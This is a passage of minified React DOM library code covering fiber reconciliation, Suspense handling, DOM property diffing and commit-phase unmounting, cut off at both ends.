      (v = typeof x == "function" || typeof i.getSnapshotBeforeUpdate == "function") || typeof i.UNSAFE_componentWillReceiveProps != "function" && typeof i.componentWillReceiveProps != "function" || (u !== m || h !== a) && Es(t, i, r, a), be = !1, h = t.memoizedState, i.state = h, Xr(t, r, i, l);
      var w = t.memoizedState;
      u !== m || h !== w || pe.current || be ? (typeof x == "function" && (zo(t, n, x, r), w = t.memoizedState), (d = be || Ns(t, n, d, r, h, w, a) || !1) ? (v || typeof i.UNSAFE_componentWillUpdate != "function" && typeof i.componentWillUpdate != "function" || (typeof i.componentWillUpdate == "function" && i.componentWillUpdate(r, w, a), typeof i.UNSAFE_componentWillUpdate == "function" && i.UNSAFE_componentWillUpdate(r, w, a)), typeof i.componentDidUpdate == "function" && (t.flags |= 4), typeof i.getSnapshotBeforeUpdate == "function" && (t.flags |= 1024)) : (typeof i.componentDidUpdate != "function" || u === e.memoizedProps && h === e.memoizedState || (t.flags |= 4), typeof i.getSnapshotBeforeUpdate != "function" || u === e.memoizedProps && h === e.memoizedState || (t.flags |= 1024), t.memoizedProps = r, t.memoizedState = w), i.props = r, i.state = w, i.context = a, r = d) : (typeof i.componentDidUpdate != "function" || u === e.memoizedProps && h === e.memoizedState || (t.flags |= 4), typeof i.getSnapshotBeforeUpdate != "function" || u === e.memoizedProps && h === e.memoizedState || (t.flags |= 1024), r = !1)
  }
  return Ro(e, t, n, r, o, l)
}

function Ro(e, t, n, r, l, o) {
  $a(e, t);
  var i = (t.flags & 128) !== 0;
  if (!r && !i) return l && ks(t, n, !1), Ge(e, t, o);
  r = t.stateNode, Sd.current = t;
  var u = i && typeof n.getDerivedStateFromError != "function" ? null : r.render();
  return t.flags |= 1, e !== null && i ? (t.child = ln(t, e.child, null, o), t.child = ln(t, null, u, o)) : se(e, t, u, o), t.memoizedState = r.state, l && ks(t, n, !0), t.child
}

function Wa(e) {
  var t = e.stateNode;
  t.pendingContext ? ws(e, t.pendingContext, t.pendingContext !== t.context) : t.context && ws(e, t.context, !1), xi(e, t.containerInfo)
}

function Os(e, t, n, r, l) {
  return rn(), pi(l), t.flags |= 256, se(e, t, n, r), t.child
}
var Io = {
  dehydrated: null,
  treeContext: null,
  retryLane: 0
};

function Do(e) {
  return {
      baseLanes: e,
      cachePool: null,
      transitions: null
  }
}

function qa(e, t, n) {
  var r = t.pendingProps,
      l = U.current,
      o = !1,
      i = (t.flags & 128) !== 0,
      u;
  if ((u = i) || (u = e !== null && e.memoizedState === null ? !1 : (l & 2) !== 0), u ? (o = !0, t.flags &= -129) : (e === null || e.memoizedState !== null) && (l |= 1), A(U, l & 1), e === null) return Eo(t), e = t.memoizedState, e !== null && (e = e.dehydrated, e !== null) ? (t.mode & 1 ? e.data === "$!" ? t.lanes = 8 : t.lanes = 1073741824 : t.lanes = 1, null) : (i = r.children, e = r.fallback, o ? (r = t.mode, o = t.child, i = {
      mode: "hidden",
      children: i
  }, !(r & 1) && o !== null ? (o.childLanes = 0, o.pendingProps = i) : o = vl(i, r, 0, null), e = Et(e, r, n, null), o.return = t, e.return = t, o.sibling = e, t.child = o, t.child.memoizedState = Do(n), t.memoizedState = Io, e) : Ei(t, i));
  if (l = e.memoizedState, l !== null && (u = l.dehydrated, u !== null)) return Cd(e, t, i, r, u, l, n);
  if (o) {
      o = r.fallback, i = t.mode, l = e.child, u = l.sibling;
      var a = {
          mode: "hidden",
          children: r.children
      };
      return !(i & 1) && t.child !== l ? (r = t.child, r.childLanes = 0, r.pendingProps = a, t.deletions = null) : (r = pt(l, a), r.subtreeFlags = l.subtreeFlags & 14680064), u !== null ? o = pt(u, o) : (o = Et(o, i, n, null), o.flags |= 2), o.return = t, r.return = t, r.sibling = o, t.child = r, r = o, o = t.child, i = e.child.memoizedState, i = i === null ? Do(n) : {
          baseLanes: i.baseLanes | n,
          cachePool: null,
          transitions: i.transitions
      }, o.memoizedState = i, o.childLanes = e.childLanes & ~n, t.memoizedState = Io, r
  }
  return o = e.child, e = o.sibling, r = pt(o, {
      mode: "visible",
      children: r.children
  }), !(t.mode & 1) && (r.lanes = n), r.return = t, r.sibling = null, e !== null && (n = t.deletions, n === null ? (t.deletions = [e], t.flags |= 16) : n.push(e)), t.child = r, t.memoizedState = null, r
}

function Ei(e, t) {
  return t = vl({
      mode: "visible",
      children: t
  }, e.mode, 0, null), t.return = e, e.child = t
}

function xr(e, t, n, r) {
  return r !== null && pi(r), ln(t, e.child, null, n), e = Ei(t, t.pendingProps.children), e.flags |= 2, t.memoizedState = null, e
}

function Cd(e, t, n, r, l, o, i) {
  if (n) return t.flags & 256 ? (t.flags &= -257, r = Zl(Error(g(422))), xr(e, t, i, r)) : t.memoizedState !== null ? (t.child = e.child, t.flags |= 128, null) : (o = r.fallback, l = t.mode, r = vl({
      mode: "visible",
      children: r.children
  }, l, 0, null), o = Et(o, l, i, null), o.flags |= 2, r.return = t, o.return = t, r.sibling = o, t.child = r, t.mode & 1 && ln(t, e.child, null, i), t.child.memoizedState = Do(i), t.memoizedState = Io, o);
  if (!(t.mode & 1)) return xr(e, t, i, null);
  if (l.data === "$!") {
      if (r = l.nextSibling && l.nextSibling.dataset, r) var u = r.dgst;
      return r = u, o = Error(g(419)), r = Zl(o, r, void 0), xr(e, t, i, r)
  }
  if (u = (i & e.childLanes) !== 0, fe || u) {
      if (r = b, r !== null) {
          switch (i & -i) {
          case 4:
              l = 2;
              break;
          case 16:
              l = 8;
              break;
          case 64:
          case 128:
          case 256:
          case 512:
          case 1024:
          case 2048:
          case 4096:
          case 8192:
          case 16384:
          case 32768:
          case 65536:
          case 131072:
          case 262144:
          case 524288:
          case 1048576:
          case 2097152:
          case 4194304:
          case 8388608:
          case 16777216:
          case 33554432:
          case 67108864:
              l = 32;
              break;
          case 536870912:
              l = 268435456;
              break;
          default:
              l = 0
          }
          l = l & (r.suspendedLanes | i) ? 0 : l, l !== 0 && l !== o.retryLane && (o.retryLane = l, Ke(e, l), Ie(r, e, l, -1))
      }
      return Ri(), r = Zl(Error(g(421))), xr(e, t, i, r)
  }
  return l.data === "$?" ? (t.flags |= 128, t.child = e.child, t = Od.bind(null, e), l._reactRetry = t, null) : (e = o.treeContext, ye = at(l.nextSibling), ge = t, V = !0, Te = null, e !== null && (je[Se++] = $e, je[Se++] = We, je[Se++] = zt, $e = e.id, We = e.overflow, zt = t), t = Ei(t, r.children), t.flags |= 4096, t)
}

function Hs(e, t, n) {
  e.lanes |= t;
  var r = e.alternate;
  r !== null && (r.lanes |= t), Po(e.return, t, n)
}

function Kl(e, t, n, r, l) {
  var o = e.memoizedState;
  o === null ? e.memoizedState = {
      isBackwards: t,
      rendering: null,
      renderingStartTime: 0,
      last: r,
      tail: n,
      tailMode: l
  } : (o.isBackwards = t, o.rendering = null, o.renderingStartTime = 0, o.last = r, o.tail = n, o.tailMode = l)
}

function Qa(e, t, n) {
  var r = t.pendingProps,
      l = r.revealOrder,
      o = r.tail;
  if (se(e, t, r.children, n), r = U.current, r & 2) r = r & 1 | 2, t.flags |= 128;
  else {
      if (e !== null && e.flags & 128) e: for (e = t.child; e !== null;) {
          if (e.tag === 13) e.memoizedState !== null && Hs(e, n, t);
          else if (e.tag === 19) Hs(e, n, t);
          else if (e.child !== null) {
              e.child.return = e, e = e.child;
              continue
          }
          if (e === t) break e;
          for (; e.sibling === null;) {
              if (e.return === null || e.return === t) break e;
              e = e.return
          }
          e.sibling.return = e.return, e = e.sibling
      }
      r &= 1
  }
  if (A(U, r), !(t.mode & 1)) t.memoizedState = null;
  else switch (l) {
  case "forwards":
      for (n = t.child, l = null; n !== null;) e = n.alternate, e !== null && Yr(e) === null && (l = n), n = n.sibling;
      n = l, n === null ? (l = t.child, t.child = null) : (l = n.sibling, n.sibling = null), Kl(t, !1, l, n, o);
      break;
  case "backwards":
      for (n = null, l = t.child, t.child = null; l !== null;) {
          if (e = l.alternate, e !== null && Yr(e) === null) {
              t.child = l;
              break
          }
          e = l.sibling, l.sibling = n, n = l, l = e
      }
      Kl(t, !0, n, null, o);
      break;
  case "together":
      Kl(t, !1, null, null, void 0);
      break;
  default:
      t.memoizedState = null
  }
  return t.child
}

function Lr(e, t) {
  !(t.mode & 1) && e !== null && (e.alternate = null, t.alternate = null, t.flags |= 2)
}

function Ge(e, t, n) {
  if (e !== null && (t.dependencies = e.dependencies), Lt |= t.lanes, !(n & t.childLanes)) return null;
  if (e !== null && t.child !== e.child) throw Error(g(153));
  if (t.child !== null) {
      for (e = t.child, n = pt(e, e.pendingProps), t.child = n, n.return = t; e.sibling !== null;) e = e.sibling, n = n.sibling = pt(e, e.pendingProps), n.return = t;
      n.sibling = null
  }
  return t.child
}

function _d(e, t, n) {
  switch (t.tag) {
  case 3:
      Wa(t), rn();
      break;
  case 5:
      xa(t);
      break;
  case 1:
      he(t.type) && qr(t);
      break;
  case 4:
      xi(t, t.stateNode.containerInfo);
      break;
  case 10:
      var r = t.type._context,
          l = t.memoizedProps.value;
      A(Kr, r._currentValue), r._currentValue = l;
      break;
  case 13:
      if (r = t.memoizedState, r !== null) return r.dehydrated !== null ? (A(U, U.current & 1), t.flags |= 128, null) : n & t.child.childLanes ? qa(e, t, n) : (A(U, U.current & 1), e = Ge(e, t, n), e !== null ? e.sibling : null);
      A(U, U.current & 1);
      break;
  case 19:
      if (r = (n & t.childLanes) !== 0, e.flags & 128) {
          if (r) return Qa(e, t, n);
          t.flags |= 128
      }
      if (l = t.memoizedState, l !== null && (l.rendering = null, l.tail = null, l.lastEffect = null), A(U, U.current), r) break;
      return null;
  case 22:
  case 23:
      return t.lanes = 0, Ba(e, t, n)
  }
  return Ge(e, t, n)
}
var Za, Ao, Ka, Ga;
Za = function (e, t) {
  for (var n = t.child; n !== null;) {
      if (n.tag === 5 || n.tag === 6) e.appendChild(n.stateNode);
      else if (n.tag !== 4 && n.child !== null) {
          n.child.return = n, n = n.child;
          continue
      }
      if (n === t) break;
      for (; n.sibling === null;) {
          if (n.return === null || n.return === t) return;
          n = n.return
      }
      n.sibling.return = n.return, n = n.sibling
  }
};
Ao = function () {};
Ka = function (e, t, n, r) {
  var l = e.memoizedProps;
  if (l !== r) {
      e = t.stateNode, _t(Ve.current);
      var o = null;
      switch (n) {
      case "input":
          l = ro(e, l), r = ro(e, r), o = [];
          break;
      case "select":
          l = $({}, l, {
              value: void 0
          }), r = $({}, r, {
              value: void 0
          }), o = [];
          break;
      case "textarea":
          l = io(e, l), r = io(e, r), o = [];
          break;
      default:
          typeof l.onClick != "function" && typeof r.onClick == "function" && (e.onclick = $r)
      }
      uo(n, r);
      var i;
      n = null;
      for (d in l)
          if (!r.hasOwnProperty(d) && l.hasOwnProperty(d) && l[d] != null)
              if (d === "style") {
                  var u = l[d];
                  for (i in u) u.hasOwnProperty(i) && (n || (n = {}), n[i] = "")
              } else d !== "dangerouslySetInnerHTML" && d !== "children" && d !== "suppressContentEditableWarning" && d !== "suppressHydrationWarning" && d !== "autoFocus" && (Dn.hasOwnProperty(d) ? o || (o = []) : (o = o || []).push(d, null));
      for (d in r) {
          var a = r[d];
          if (u = l != null ? l[d] : void 0, r.hasOwnProperty(d) && a !== u && (a != null || u != null))
              if (d === "style")
                  if (u) {
                      for (i in u) !u.hasOwnProperty(i) || a && a.hasOwnProperty(i) || (n || (n = {}), n[i] = "");
                      for (i in a) a.hasOwnProperty(i) && u[i] !== a[i] && (n || (n = {}), n[i] = a[i])
                  } else n || (o || (o = []), o.push(d, n)), n = a;
          else d === "dangerouslySetInnerHTML" ? (a = a ? a.__html : void 0, u = u ? u.__html : void 0, a != null && u !== a && (o = o || []).push(d, a)) : d === "children" ? typeof a != "string" && typeof a != "number" || (o = o || []).push(d, "" + a) : d !== "suppressContentEditableWarning" && d !== "suppressHydrationWarning" && (Dn.hasOwnProperty(d) ? (a != null && d === "onScroll" && H("scroll", e), o || u === a || (o = [])) : (o = o || []).push(d, a))
      }
      n && (o = o || []).push("style", n);
      var d = o;
      (t.updateQueue = d) && (t.flags |= 4)
  }
};
Ga = function (e, t, n, r) {
  n !== r && (t.flags |= 4)
};

function wn(e, t) {
  if (!V) switch (e.tailMode) {
  case "hidden":
      t = e.tail;
      for (var n = null; t !== null;) t.alternate !== null && (n = t), t = t.sibling;
      n === null ? e.tail = null : n.sibling = null;
      break;
  case "collapsed":
      n = e.tail;
      for (var r = null; n !== null;) n.alternate !== null && (r = n), n = n.sibling;
      r === null ? t || e.tail === null ? e.tail = null : e.tail.sibling = null : r.sibling = null
  }
}

function le(e) {
  var t = e.alternate !== null && e.alternate.child === e.child,
      n = 0,
      r = 0;
  if (t)
      for (var l = e.child; l !== null;) n |= l.lanes | l.childLanes, r |= l.subtreeFlags & 14680064, r |= l.flags & 14680064, l.return = e, l = l.sibling;
  else
      for (l = e.child; l !== null;) n |= l.lanes | l.childLanes, r |= l.subtreeFlags, r |= l.flags, l.return = e, l = l.sibling;
  return e.subtreeFlags |= r, e.childLanes = n, t
}

function Nd(e, t, n) {
  var r = t.pendingProps;
  switch (fi(t), t.tag) {
  case 2:
  case 16:
  case 15:
  case 0:
  case 11:
  case 7:
  case 8:
  case 12:
  case 9:
  case 14:
      return le(t), null;
  case 1:
      return he(t.type) && Wr(), le(t), null;
  case 3:
      return r = t.stateNode, on(), F(pe), F(ie), ki(), r.pendingContext && (r.context = r.pendingContext, r.pendingContext = null), (e === null || e.child === null) && (yr(t) ? t.flags |= 4 : e === null || e.memoizedState.isDehydrated && !(t.flags & 256) || (t.flags |= 1024, Te !== null && (Wo(Te), Te = null))), Ao(e, t), le(t), null;
  case 5:
      wi(t);
      var l = _t(Zn.current);
      if (n = t.type, e !== null && t.stateNode != null) Ka(e, t, n, r, l), e.ref !== t.ref && (t.flags |= 512, t.flags |= 2097152);
      else {
          if (!r) {
              if (t.stateNode === null) throw Error(g(166));
              return le(t), null
          }
          if (e = _t(Ve.current), yr(t)) {
              r = t.stateNode, n = t.type;
              var o = t.memoizedProps;
              switch (r[He] = t, r[qn] = o, e = (t.mode & 1) !== 0, n) {
              case "dialog":
                  H("cancel", r), H("close", r);
                  break;
              case "iframe":
              case "object":
              case "embed":
                  H("load", r);
                  break;
              case "video":
              case "audio":
                  for (l = 0; l < _n.length; l++) H(_n[l], r);
                  break;
              case "source":
                  H("error", r);
                  break;
              case "img":
              case "image":
              case "link":
                  H("error", r), H("load", r);
                  break;
              case "details":
                  H("toggle", r);
                  break;
              case "input":
                  Zi(r, o), H("invalid", r);
                  break;
              case "select":
                  r._wrapperState = {
                      wasMultiple: !!o.multiple
                  }, H("invalid", r);
                  break;
              case "textarea":
                  Gi(r, o), H("invalid", r)
              }
              uo(n, o), l = null;
              for (var i in o)
                  if (o.hasOwnProperty(i)) {
                      var u = o[i];
                      i === "children" ? typeof u == "string" ? r.textContent !== u && (o.suppressHydrationWarning !== !0 && vr(r.textContent, u, e), l = ["children", u]) : typeof u == "number" && r.textContent !== "" + u && (o.suppressHydrationWarning !== !0 && vr(r.textContent, u, e), l = ["children", "" + u]) : Dn.hasOwnProperty(i) && u != null && i === "onScroll" && H("scroll", r)
                  } switch (n) {
              case "input":
                  ur(r), Ki(r, o, !0);
                  break;
              case "textarea":
                  ur(r), Xi(r);
                  break;
              case "select":
              case "option":
                  break;
              default:
                  typeof o.onClick == "function" && (r.onclick = $r)
              }
              r = l, t.updateQueue = r, r !== null && (t.flags |= 4)
          } else {
              i = l.nodeType === 9 ? l : l.ownerDocument, e === "http://www.w3.org/1999/xhtml" && (e = ju(n)), e === "http://www.w3.org/1999/xhtml" ? n === "script" ? (e = i.createElement("div"), e.innerHTML = "<script><\/script>", e = e.removeChild(e.firstChild)) : typeof r.is == "string" ? e = i.createElement(n, {
                  is: r.is
              }) : (e = i.createElement(n), n === "select" && (i = e, r.multiple ? i.multiple = !0 : r.size && (i.size = r.size))) : e = i.createElementNS(e, n), e[He] = t, e[qn] = r, Za(e, t, !1, !1), t.stateNode = e;
              e: {
                  switch (i = ao(n, r), n) {
                  case "dialog":
                      H("cancel", e), H("close", e), l = r;
                      break;
                  case "iframe":
                  case "object":
                  case "embed":
                      H("load", e), l = r;
                      break;
                  case "video":
                  case "audio":
                      for (l = 0; l < _n.length; l++) H(_n[l], e);
                      l = r;
                      break;
                  case "source":
                      H("error", e), l = r;
                      break;
                  case "img":
                  case "image":
                  case "link":
                      H("error", e), H("load", e), l = r;
                      break;
                  case "details":
                      H("toggle", e), l = r;
                      break;
                  case "input":
                      Zi(e, r), l = ro(e, r), H("invalid", e);
                      break;
                  case "option":
                      l = r;
                      break;
                  case "select":
                      e._wrapperState = {
                          wasMultiple: !!r.multiple
                      }, l = $({}, r, {
                          value: void 0
                      }), H("invalid", e);
                      break;
                  case "textarea":
                      Gi(e, r), l = io(e, r), H("invalid", e);
                      break;
                  default:
                      l = r
                  }
                  uo(n, l),
                  u = l;
                  for (o in u)
                      if (u.hasOwnProperty(o)) {
                          var a = u[o];
                          o === "style" ? _u(e, a) : o === "dangerouslySetInnerHTML" ? (a = a ? a.__html : void 0, a != null && Su(e, a)) : o === "children" ? typeof a == "string" ? (n !== "textarea" || a !== "") && An(e, a) : typeof a == "number" && An(e, "" + a) : o !== "suppressContentEditableWarning" && o !== "suppressHydrationWarning" && o !== "autoFocus" && (Dn.hasOwnProperty(o) ? a != null && o === "onScroll" && H("scroll", e) : a != null && Yo(e, o, a, i))
                      } switch (n) {
                  case "input":
                      ur(e), Ki(e, r, !1);
                      break;
                  case "textarea":
                      ur(e), Xi(e);
                      break;
                  case "option":
                      r.value != null && e.setAttribute("value", "" + ht(r.value));
                      break;
                  case "select":
                      e.multiple = !!r.multiple, o = r.value, o != null ? Gt(e, !!r.multiple, o, !1) : r.defaultValue != null && Gt(e, !!r.multiple, r.defaultValue, !0);
                      break;
                  default:
                      typeof l.onClick == "function" && (e.onclick = $r)
                  }
                  switch (n) {
                  case "button":
                  case "input":
                  case "select":
                  case "textarea":
                      r = !!r.autoFocus;
                      break e;
                  case "img":
                      r = !0;
                      break e;
                  default:
                      r = !1
                  }
              }
              r && (t.flags |= 4)
          }
          t.ref !== null && (t.flags |= 512, t.flags |= 2097152)
      }
      return le(t), null;
  case 6:
      if (e && t.stateNode != null) Ga(e, t, e.memoizedProps, r);
      else {
          if (typeof r != "string" && t.stateNode === null) throw Error(g(166));
          if (n = _t(Zn.current), _t(Ve.current), yr(t)) {
              if (r = t.stateNode, n = t.memoizedProps, r[He] = t, (o = r.nodeValue !== n) && (e = ge, e !== null)) switch (e.tag) {
              case 3:
                  vr(r.nodeValue, n, (e.mode & 1) !== 0);
                  break;
              case 5:
                  e.memoizedProps.suppressHydrationWarning !== !0 && vr(r.nodeValue, n, (e.mode & 1) !== 0)
              }
              o && (t.flags |= 4)
          } else r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r), r[He] = t, t.stateNode = r
      }
      return le(t), null;
  case 13:
      if (F(U), r = t.memoizedState, e === null || e.memoizedState !== null && e.memoizedState.dehydrated !== null) {
          if (V && ye !== null && t.mode & 1 && !(t.flags & 128)) fa(), rn(), t.flags |= 98560, o = !1;
          else if (o = yr(t), r !== null && r.dehydrated !== null) {
              if (e === null) {
                  if (!o) throw Error(g(318));
                  if (o = t.memoizedState, o = o !== null ? o.dehydrated : null, !o) throw Error(g(317));
                  o[He] = t
              } else rn(), !(t.flags & 128) && (t.memoizedState = null), t.flags |= 4;
              le(t), o = !1
          } else Te !== null && (Wo(Te), Te = null), o = !0;
          if (!o) return t.flags & 65536 ? t : null
      }
      return t.flags & 128 ? (t.lanes = n, t) : (r = r !== null, r !== (e !== null && e.memoizedState !== null) && r && (t.child.flags |= 8192, t.mode & 1 && (e === null || U.current & 1 ? X === 0 && (X = 3) : Ri())), t.updateQueue !== null && (t.flags |= 4), le(t), null);
  case 4:
      return on(), Ao(e, t), e === null && $n(t.stateNode.containerInfo), le(t), null;
  case 10:
      return vi(t.type._context), le(t), null;
  case 17:
      return he(t.type) && Wr(), le(t), null;
  case 19:
      if (F(U), o = t.memoizedState, o === null) return le(t), null;
      if (r = (t.flags & 128) !== 0, i = o.rendering, i === null)
          if (r) wn(o, !1);
          else {
              if (X !== 0 || e !== null && e.flags & 128)
                  for (e = t.child; e !== null;) {
                      if (i = Yr(e), i !== null) {
                          for (t.flags |= 128, wn(o, !1), r = i.updateQueue, r !== null && (t.updateQueue = r, t.flags |= 4), t.subtreeFlags = 0, r = n, n = t.child; n !== null;) o = n, e = r, o.flags &= 14680066, i = o.alternate, i === null ? (o.childLanes = 0, o.lanes = e, o.child = null, o.subtreeFlags = 0, o.memoizedProps = null, o.memoizedState = null, o.updateQueue = null, o.dependencies = null, o.stateNode = null) : (o.childLanes = i.childLanes, o.lanes = i.lanes, o.child = i.child, o.subtreeFlags = 0, o.deletions = null, o.memoizedProps = i.memoizedProps, o.memoizedState = i.memoizedState, o.updateQueue = i.updateQueue, o.type = i.type, e = i.dependencies, o.dependencies = e === null ? null : {
                              lanes: e.lanes,
                              firstContext: e.firstContext
                          }), n = n.sibling;
                          return A(U, U.current & 1 | 2), t.child
                      }
                      e = e.sibling
                  }
              o.tail !== null && Z() > un && (t.flags |= 128, r = !0, wn(o, !1), t.lanes = 4194304)
          }
      else {
          if (!r)
              if (e = Yr(i), e !== null) {
                  if (t.flags |= 128, r = !0, n = e.updateQueue, n !== null && (t.updateQueue = n, t.flags |= 4), wn(o, !0), o.tail === null && o.tailMode === "hidden" && !i.alternate && !V) return le(t), null
              } else 2 * Z() - o.renderingStartTime > un && n !== 1073741824 && (t.flags |= 128, r = !0, wn(o, !1), t.lanes = 4194304);
          o.isBackwards ? (i.sibling = t.child, t.child = i) : (n = o.last, n !== null ? n.sibling = i : t.child = i, o.last = i)
      }
      return o.tail !== null ? (t = o.tail, o.rendering = t, o.tail = t.sibling, o.renderingStartTime = Z(), t.sibling = null, n = U.current, A(U, r ? n & 1 | 2 : n & 1), t) : (le(t), null);
  case 22:
  case 23:
      return Ti(), r = t.memoizedState !== null, e !== null && e.memoizedState !== null !== r && (t.flags |= 8192), r && t.mode & 1 ? ve & 1073741824 && (le(t), t.subtreeFlags & 6 && (t.flags |= 8192)) : le(t), null;
  case 24:
      return null;
  case 25:
      return null
  }
  throw Error(g(156, t.tag))
}

function Ed(e, t) {
  switch (fi(t), t.tag) {
  case 1:
      return he(t.type) && Wr(), e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
  case 3:
      return on(), F(pe), F(ie), ki(), e = t.flags, e & 65536 && !(e & 128) ? (t.flags = e & -65537 | 128, t) : null;
  case 5:
      return wi(t), null;
  case 13:
      if (F(U), e = t.memoizedState, e !== null && e.dehydrated !== null) {
          if (t.alternate === null) throw Error(g(340));
          rn()
      }
      return e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
  case 19:
      return F(U), null;
  case 4:
      return on(), null;
  case 10:
      return vi(t.type._context), null;
  case 22:
  case 23:
      return Ti(), null;
  case 24:
      return null;
  default:
      return null
  }
}
var wr = !1,
  oe = !1,
  Pd = typeof WeakSet == "function" ? WeakSet : Set,
  j = null;

function Zt(e, t) {
  var n = e.ref;
  if (n !== null)
      if (typeof n == "function") try {
          n(null)
      } catch (r) {
          W(e, t, r)
      } else n.current = null
}

function Oo(e, t, n) {
  try {
      n()
  } catch (r) {
      W(e, t, r)
  }
}
var Fs = !1;

function zd(e, t) {
  if (wo = Vr, e = bu(), ci(e)) {
      if ("selectionStart" in e) var n = {
          start: e.selectionStart,
          end: e.selectionEnd
      };
      else e: {
          n = (n = e.ownerDocument) && n.defaultView || window;
          var r = n.getSelection && n.getSelection();
          if (r && r.rangeCount !== 0) {
              n = r.anchorNode;
              var l = r.anchorOffset,
                  o = r.focusNode;
              r = r.focusOffset;
              try {
                  n.nodeType, o.nodeType
              } catch {
                  n = null;
                  break e
              }
              var i = 0,
                  u = -1,
                  a = -1,
                  d = 0,
                  v = 0,
                  m = e,
                  h = null;
              t: for (;;) {
                  for (var x; m !== n || l !== 0 && m.nodeType !== 3 || (u = i + l), m !== o || r !== 0 && m.nodeType !== 3 || (a = i + r), m.nodeType === 3 && (i += m.nodeValue.length), (x = m.firstChild) !== null;) h = m, m = x;
                  for (;;) {
                      if (m === e) break t;
                      if (h === n && ++d === l && (u = i), h === o && ++v === r && (a = i), (x = m.nextSibling) !== null) break;
                      m = h, h = m.parentNode
                  }
                  m = x
              }
              n = u === -1 || a === -1 ? null : {
                  start: u,
                  end: a
              }
          } else n = null
      }
      n = n || {
          start: 0,
          end: 0
      }
  } else n = null;
  for (ko = {
          focusedElem: e,
          selectionRange: n
      }, Vr = !1, j = t; j !== null;)
      if (t = j, e = t.child, (t.subtreeFlags & 1028) !== 0 && e !== null) e.return = t, j = e;
      else
          for (; j !== null;) {
              t = j;
              try {
                  var w = t.alternate;
                  if (t.flags & 1024) switch (t.tag) {
                  case 0:
                  case 11:
                  case 15:
                      break;
                  case 1:
                      if (w !== null) {
                          var k = w.memoizedProps,
                              D = w.memoizedState,
                              f = t.stateNode,
                              c = f.getSnapshotBeforeUpdate(t.elementType === t.type ? k : Me(t.type, k), D);
                          f.__reactInternalSnapshotBeforeUpdate = c
                      }
                      break;
                  case 3:
                      var p = t.stateNode.containerInfo;
                      p.nodeType === 1 ? p.textContent = "" : p.nodeType === 9 && p.documentElement && p.removeChild(p.documentElement);
                      break;
                  case 5:
                  case 6:
                  case 4:
                  case 17:
                      break;
                  default:
                      throw Error(g(163))
                  }
              } catch (y) {
                  W(t, t.return, y)
              }
              if (e = t.sibling, e !== null) {
                  e.return = t.return, j = e;
                  break
              }
              j = t.return
          }
  return w = Fs, Fs = !1, w
}

function Tn(e, t, n) {
  var r = t.updateQueue;
  if (r = r !== null ? r.lastEffect : null, r !== null) {
      var l = r = r.next;
      do {
          if ((l.tag & e) === e) {
              var o = l.destroy;
              l.destroy = void 0, o !== void 0 && Oo(t, n, o)
          }
          l = l.next
      } while (l !== r)
  }
}

function hl(e, t) {
  if (t = t.updateQueue, t = t !== null ? t.lastEffect : null, t !== null) {
      var n = t = t.next;
      do {
          if ((n.tag & e) === e) {
              var r = n.create;
              n.destroy = r()
          }
          n = n.next
      } while (n !== t)
  }
}

function Ho(e) {
  var t = e.ref;
  if (t !== null) {
      var n = e.stateNode;
      switch (e.tag) {
      case 5:
          e = n;
          break;
      default:
          e = n
      }
      typeof t == "function" ? t(e) : t.current = e
  }
}

function Xa(e) {
  var t = e.alternate;
  t !== null && (e.alternate = null, Xa(t)), e.child = null, e.deletions = null, e.sibling = null, e.tag === 5 && (t = e.stateNode, t !== null && (delete t[He], delete t[qn], delete t[Co], delete t[dd], delete t[fd])), e.stateNode = null, e.return = null, e.dependencies = null, e.memoizedProps = null, e.memoizedState = null, e.pendingProps = null, e.stateNode = null, e.updateQueue = null
}

function Ya(e) {
  return e.tag === 5 || e.tag === 3 || e.tag === 4
}

function Vs(e) {
  e: for (;;) {
      for (; e.sibling === null;) {
          if (e.return === null || Ya(e.return)) return null;
          e = e.return
      }
      for (e.sibling.return = e.return, e = e.sibling; e.tag !== 5 && e.tag !== 6 && e.tag !== 18;) {
          if (e.flags & 2 || e.child === null || e.tag === 4) continue e;
          e.child.return = e, e = e.child
      }
      if (!(e.flags & 2)) return e.stateNode
  }
}

function Fo(e, t, n) {
  var r = e.tag;
  if (r === 5 || r === 6) e = e.stateNode, t ? n.nodeType === 8 ? n.parentNode.insertBefore(e, t) : n.insertBefore(e, t) : (n.nodeType === 8 ? (t = n.parentNode, t.insertBefore(e, n)) : (t = n, t.appendChild(e)), n = n._reactRootContainer, n != null || t.onclick !== null || (t.onclick = $r));
  else if (r !== 4 && (e = e.child, e !== null))
      for (Fo(e, t, n), e = e.sibling; e !== null;) Fo(e, t, n), e = e.sibling
}

function Vo(e, t, n) {
  var r = e.tag;
  if (r === 5 || r === 6) e = e.stateNode, t ? n.insertBefore(e, t) : n.appendChild(e);
  else if (r !== 4 && (e = e.child, e !== null))
      for (Vo(e, t, n), e = e.sibling; e !== null;) Vo(e, t, n), e = e.sibling
}
var ee = null,
  Le = !1;

function Ye(e, t, n) {
  for (n = n.child; n !== null;) Ja(e, t, n), n = n.sibling
}

function Ja(e, t, n) {
  if (Fe && typeof Fe.onCommitFiberUnmount == "function") try {
      Fe.onCommitFiberUnmount(il, n)
  } catch {}
  switch (n.tag) {
  case 5:
      oe || Zt(n, t);
  case 6:
      var r = ee,
          l = Le;
      ee = null, Ye(e, t, n), ee = r, Le = l, ee !== null && (Le ? (e = ee, n = n.stateNode, e.nodeType === 8 ? e.parentNode.removeChild(n) : e.removeChild(n)) : ee.removeChild(n.stateNode));
      break;
  case 18:
      ee !== null && (Le ? (e = ee, n = n.stateNode, e.nodeType === 8 ? Ul(e.parentNode, n) : e.nodeType === 1 && Ul(e, n), Vn(e)) : Ul(ee, n.stateNode));
      break;
  case 4:
      r = ee, l = Le, ee = n.stateNode.containerInfo, Le = !0, Ye(e, t, n), ee = r, Le = l;
      break;
  case 0:
  case 11:
  case 14:
  case 15:
      if (!oe && (r = n.updateQueue, r !== null && (r = r.lastEffect, r !== null))) {
          l = r = r.next;
          do {
              var o = l,
                  i = o.destroy;
              o = o.tag, i !== void 0 && (o & 2 || o & 4) && Oo(n, t, i), l = l.next
          } while (l !== r)
      }
      Ye(e, t, n);
      break;
  case 1:
      if (!oe && (Zt(n, t), r = n.stateNode, typeof r.componentWillUnmount == "function")) try {
          r.props = n.memoizedProps, r.state = n.memoizedState, r.componentWillUnmount()
      } catch (u) {
          W(n, t, u)
      }
      Ye(e, t, n);
      break;
  case 21:
      Ye(e, t, n);
      break;
  case 22:
      n.mode & 1 ? (oe = (r = oe) || n.memoizedState !== null, Ye(e, t, n), oe = r) : Ye(e, t, n);
      break;
